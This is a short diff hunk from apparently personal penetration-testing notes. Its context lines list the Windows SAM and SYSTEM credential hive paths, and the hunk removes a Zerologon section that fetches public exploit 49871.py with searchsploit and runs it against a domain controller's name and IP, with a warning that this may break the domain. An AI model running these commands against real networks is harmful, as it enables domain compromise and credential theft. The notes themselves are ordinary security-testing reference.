@@ -202,9 +202,3 @@ Location:
 C:/Windows/System32/config/SAM
 C:/Windows/System32/config/SYSTEM
 ```
-
-###### Zerologon (probably going to break the domain, not recommended..)
-```
-$ searchsploit -m 49871.py
-$ python3 49871.py -do check -target NETBIOSNAME -ip 192.168.1.1
-```
